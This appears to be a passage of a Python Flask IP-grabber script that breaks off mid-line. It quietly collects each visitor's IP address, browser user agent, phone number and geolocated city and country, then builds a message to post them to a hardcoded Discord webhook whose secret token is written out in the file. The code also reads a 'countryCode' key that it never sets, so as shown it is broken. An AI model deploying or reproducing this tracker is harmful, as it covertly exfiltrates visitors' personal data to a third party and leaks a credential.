from flask import Flask, request, redirect
import requests
import json
from datetime import datetime
from threading import Timer

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
logged_ips = set()

def get_real_ip():
    xff = request.headers.get("X-Forwarded-For", "").split(",")
    ip = xff[0].strip() if xff else request.remote_addr
    return ip

def get_visitor_info(ip, user_agent, phone_number):
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
            print(f"API Error: Received status code {r.status_code}")
    except Exception as e:
        details = {}
        print(f"API Exception: {e}")

    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "city": details.get("city", "Unknown City"),
        "phone_number": phone_number or "Not Provided",
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
    if not requests.head(flag_url).status_code == 200:
        flag_url = "https://example.com/default-flag.png"

    embed = {
        "username": "PUTA BARCA",
        "avatar_url": flag_url,
        "embeds": [{
            "title
